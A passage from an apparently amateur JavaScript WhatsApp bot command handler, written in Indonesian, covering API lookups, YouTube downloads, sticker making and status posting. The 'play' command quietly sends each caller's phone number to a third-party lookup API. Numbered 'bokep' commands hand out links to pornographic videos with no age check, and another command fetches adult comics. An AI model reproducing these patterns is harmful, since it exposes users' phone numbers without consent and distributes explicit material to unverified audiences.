     sticWait(from)
  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
  apa2 = apa.result
  reply(apa2)
  break
case 'attp':
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${namaowner}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					ronove.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					sticWait(from)
					buff = await getBuffer(anu.results.thumb)
					ronove.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					sticWait(from)
					buff = await getBuffer(anu.result.avatar_url)
					ronove.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					sticWait(from)
					buff = await getBuffer(anu.result.Map)
					ronove.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        ronove.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return reply('Sudah diaktifkan sebelumnya!')
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('Sudah di NonAktifkan sebelumnya!')
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break
                
      case "take":
      case "colong":
        if (!isQuotedSticker) return reply("Stiker aja om");
        if (!isOwner && !q && !mek.key.fromMe) return reply(`Ex: ${prefix + command} ᴅɪᴅɪɴʙᴏᴛ|DidinSec〆⁩`)
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `${namabot}`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `BY ${nok}~`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, ronove, mek, from);
        break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await ronove.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              ronove.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                ronove.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ronove.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              ronove.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                ronove.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    ronove.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${namaowner}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
      case "upswteks":
        if (!q) return fakestatus("Isi teksnya!");
        ronove.sendMessage("status@broadcast", `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
      case "upswimage":
        if (isQuotedImage) {
          const swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await ronove.downloadMediaMessage(swsw);
          ronove.sendMessage("status@broadcast", cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          ronove.sendMessage(from, bur, text, { quoted: mek });
        } else {
          fakestatus("Reply gambarnya!");
        }
        break;
      case "upswvideo":
        if (isQuotedVideo) {
          const swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await ronove.downloadMediaMessage(swsw);
          ronove.sendMessage("status@broadcast", cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          ronove.sendMessage(from, bur, text, { quoted: mek });
        } else {
          fakestatus("reply videonya!");
        }
        break;
      case "public":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await ronove.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        ronove.sendMessage(from, optionshidetag, text);
        break;
    case 'nhentaipdf':
    case 'nhentai':
             if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: fdoc})
             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
             try {
             henid = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
             get_result = get_result.result
             get_info = get_result.info
             teks = `*Doujinshi Downloader*
             
📜 Title Romaji : ${get_result.title_romaji}
📃 Title Native : ${get_result.title_native}\n`
             ini_image = await getBuffer(get_result.image[0])
             ronove.sendMessage(from, ini_image, image, { caption: teks, quoted: fdoc, thumbnail: Buffer.alloc(0) })
             sticWait(from)
             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
             pdf = await getBuffer(anu.result)
             ronove.sendMessage(from, pdf, document, { quoted: fdoc, mimetype: Mimetype.pdf, filename: `${args[0]}.pdf`, thumbnail: ini_image })
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
      case "play2":
              if (!q) return reply('Linknya?')
              plink = args[0]
               res = await yts(q)
			 let ress = await fetchJson(`https://api.zeks.me/api/ytplaymp3/2?apikey=${zekskey}&q=${plink}`, {method:'get'})
			gett = ress.result
			   let thmbInfo = ` 
YT PLAY HAS BEEN FOUND\n\n
• Judul : ${gett.title}\n
• Ext : mp3\n
• Size : ${gett.size}\n
• Quality : ${gett.quality}\n
• Duration : ${gett.duration}\n
• Source : ${gett.source}\n

*Silahkan pilih media yang akan di download*
`
buttons = [{buttonId:`ytmp4 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`ytmp3 ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]

imageMessage = (await ronove.prepareMessageMedia({url:gett.thumb},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

buttonsMessage = {contentText: thmbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}

prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})

ronove.relayWAMessage(prep)
break;
      case "play":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        plink = args[0]
        uwu = '*``*'
        yoii = '```'
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       tes = `blabla`
       anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3/2?apikey=${zekskey}&q=${plink}`, {method: 'get'})
      gett = anu.result
        ini_txt = `YT PLAY HAS BEEN FOUND\n\n`
        ini_txt += `• Judul : ${gett.title}\n`
        ini_txt += `• Duration : ${gett.duration}\n`
        ini_txt += `• Source : ${gett.source}\n`
        ini_txt2 = await getBuffer(gett.thumb)
sendButLocation(from, `${ini_txt}`, `Pilih opsi dibawah ini.`, {jpegThumbnail:ini_txt2}, [{buttonId:`ytvideooo ${gett.source}`,buttonText:{displayText:'🎥VIDEO'},type:1}, {buttonId:`ytlagu ${gett.source}`,buttonText:{displayText:'🎵AUDIO'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break;
      case "playvideo":
      if (args.length < 1) return reply("Where's the query?")
      sticWait(from) 
      plink = args[0]
      anu = await fetchJson(`https://api.zeks.me/api/ytplaymp4/2?apikey=${zekskey}&q=${plink}`, {method: 'get'})
      gett = anu.result
        ini_txt = `YT PLAY HAS BEEN FOUND\n\n`
        ini_txt += `• Judul : ${gett.title}\n`
        ini_txt += `• Ext : mp3\n`
        ini_txt += `• Size : ${gett.size}\n`
        ini_txt += `• Quality : ${gett.quality}\n`
        ini_txt += `• Duration : ${gett.duration}\n`
        ini_txt += `• Source : ${gett.source}\n`
        ini_txt += `• _Tunggu beberapa menit audio akan segera di kirimkan_`
        ini_xt2 = await getBuffer(gett.thumb)
        ini_tx3 = await getBuffer(gett.link)
      ronove.sendMessage(from, ini_xt2, image, { quoted: mek, caption: ini_txt })
      ronove.sendMessage(from, ini_tx3, video, { quoted: fdoc })
      break;
      case "play3":
      if (args.length < 1) return reply("Where's the link bro")
      sticWait(from) 
      plink = args[0]
      anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3/2?apikey=${zekskey}&q=${plink}`, {method: 'get'})
      gett = anu.result
        ini_txt = `YT PLAY HAS BEEN FOUND\n\n`
        ini_txt += `• Judul : ${gett.title}\n`
        ini_txt += `• Ext : mp3\n`
        ini_txt += `• Size : ${gett.size}\n`
        ini_txt += `• Quality : ${gett.quality}\n`
        ini_txt += `• Duration : ${gett.duration}\n`
        ini_txt += `• Source : ${gett.source}\n`
        ini_txt += `• _Tunggu beberapa menit audio akan segera di kirimkan_`
      buttons = [{buttonId:`ytmp4 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`ytmp3 ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]

imageMessage = (await ronove.prepareMessageMedia({url:anu.result.thumb},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

buttonsMessage = {contentText: ini_txt,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}
prot = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})
ronove.relayWAMessage(prot)
      break;
      case "video":
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "sticker":
      case "stiker":
      case "sg":
      case "sgif":
      case "s":
      case "stick":
      sticWait(from)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ronove.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              ronove.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: fgif,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ronove.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          sticWait(from);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              ronove.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: ftrol,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case "toimg":
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽??𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        sticWait(from);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;
      case "ytsearch":
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await ronove.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await ronove.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await ronove.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break
case 'bokep1':				 
            
				qute = fs.readFileSync('./ronove.jpg') 
				   
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
				   break
				   case 'bokep2':

				qute = fs.readFileSync('./ronove.jpg') 
				   
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
				   break
				   case 'bokep3':	

				qute = fs.readFileSync('./ronove.jpg') 
				   
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    
				   break
				   case 'bokep4':	

				qute = fs.readFileSync('./ronove.jpg') 
				 
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   
				   break
				   case 'bokep5':	

				qute = fs.readFileSync('./ronove.jpg') 
				 
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   
				   break
				   case 'bokep6':	

				qute = fs.readFileSync('./ronove.jpg') 
				 
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   
				   break
                   case 'bokep7':

				qute = fs.readFileSync('./ronove.jpg') 
				 
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   
				   break
		           case 'bokep8':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   
				   break
	
				   case 'bokep10':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   
				   break
				   case 'bokep11':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   
				   break
				   case 'bokep12':	
			    
				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   
				   break
				   case 'bokep13':	

				qute = fs.readFileSync('./ronove.jpg')
                  
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   
				   break
				   case 'bokep14':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   
				   break
	               case 'bokep15':

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   
				   break
    	           case 'bokep16':

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' })				   
				   break
				   case 'bokep17':	

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' })				   
				   break
				   case 'bokep18':

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' })				   
				   break
				   case 'bokep19':				 
				
				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' })				   
				   break
				   case 'bokep20':			

				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' })				   
				   break
				   case 'bokep21':				 
				
				qute = fs.readFileSync('./ronove.jpg') 
				
				   ronove.sendMessage(from, qute, image, { quoted: fgif, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' })				   
				   break
				   case 'bokep22':		

				qute = fs.readFileSync('./ronove.jpg')
                  
